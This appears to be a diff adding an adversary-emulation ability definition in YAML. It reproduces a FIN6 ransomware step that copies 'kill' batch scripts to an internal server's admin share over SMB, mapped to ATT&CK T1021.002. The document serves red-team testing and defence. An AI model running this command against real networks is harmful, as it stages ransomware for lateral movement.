@@ -1,0 +1,26 @@
+- id: 6ffca252-9eb0-4ac0-93dd-35c9e7c6fae0
+  name: Copy Kill Scripts
+  description: FIN6 utilizes cmd to copy kill scripts to an internal distribution server
+  tactic: lateral_movement
+  technique:
+    attack_id: T1021.002
+    name: 'Remote Services: SMB/Windows Admin Shares'
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_ransomware_copy
+  procedure_step: 7.1.4
+  platforms:
+    windows:
+      cmd:
+        command: |
+          copy #{batch_file} \\#{internal_IP}\c$\windows\temp\
+  input_arguments:
+    internal_IP:
+      description: Hostname or IP address
+      type: string
+      default: 172.18.39.6
+    batch_file:
+      description: windows.bat or kill.bat
+      type: string
+  executors:
+  - name: command_prompt
+    command: copy \#{batch_file} \\#{internal_IP}\c$\windows\temp\
